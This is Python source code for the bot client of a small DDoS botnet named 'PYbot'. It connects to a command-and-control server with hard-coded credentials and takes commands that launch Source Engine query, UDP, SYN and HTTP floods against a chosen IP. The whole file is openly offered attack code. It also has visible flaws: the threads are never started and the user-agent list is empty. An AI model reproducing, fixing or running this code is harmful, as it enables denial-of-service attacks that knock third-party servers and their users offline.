# PYbot - A simple Python botnet
# Author: WodX
# Date: 27/09/2019
# Bot

import socket 
import threading
import time
import random

# Configuration
HOST = '127.0.0.1'
CNC_PORT = 101


user_agents = []

# read more at https://developer.valvesoftware.com/wiki/Server_queries
def craft_vse_payload():
    b = chr(0xFF) * 4
    header = chr(0x54)
    payload = 'Source Engine Query'
    return str.encode(b + header + payload) # A2S_INFO packet

def attack_vse(ip, secs):
    payload = craft_vse_payload()
    while time.time() < secs:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(payload, (ip, 27015)) # 27015 -> default Valve Source Engine port

def attack_udp(ip, secs, size):
    while time.time() < secs:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(random._urandom(size), (ip, random.randint(1, 65535))) # ICMP destination unreachable as responses

def attack_syn(ip, secs):
    while time.time() < secs:
        sock = socket.socket()
        sock.setblocking(0)
        try:
            sock.connect((ip, random.randint(1, 65535))) # RST/ACK or SYN/ACK as response
        except:
            pass

def attack_http(ip, secs):
    while time.time() < secs:
        sock = socket.socket()
        sock.settimeout(2)
        try:
            sock.connect((ip, 80))
            sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n'.encode())
            sock.close()
        except:
            pass

def main():
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while 1:
        try:
            sock.connect((HOST, CNC_PORT))

            data = sock.recv(1024)
            while not 'Username' in data.decode():
                data = sock.recv(1024)
            sock.send('BOT'.encode())

            data = sock.recv(1024)
            while not 'Password' in data.decode():
                data = sock.recv(1024)
            sock.send('ÿÿÿÿU'.encode())

            break
        except:
            time.sleep(120)

    while 1:
        try:
            data = sock.recv(1024).decode().strip()
            if not data:
                break

            args = data.split(' ')
            prefix = args[0].upper()
            
            if prefix == '.VSE':
                ip = args[1]
                secs = time.time() + int(args[2])

                threading.Thread(target=attack_vse, args=(ip, secs))

            elif prefix == '.UDP':
                ip = args[1]
                secs = time.time() + int(args[2])
                size = int(args[3])

                threading.Thread(target=attack_udp, args=(ip, secs, size))

            elif prefix == '.SYN':
                ip = args[1]
                secs = time.time() + int(args[2])

                threading.Thread(target=attack_syn, args=(ip, secs))

            elif prefix == '.HTTP':
                ip = args[1]
                secs = time.time() + int(args[2])

                threading.Thread(target=attack_http, args=(ip, secs))

            elif prefix == 'PING':
                sock.send('PONG'.encode())

        except:
            break

    sock.close()
    main()

if __name__ == '__main__':
    main()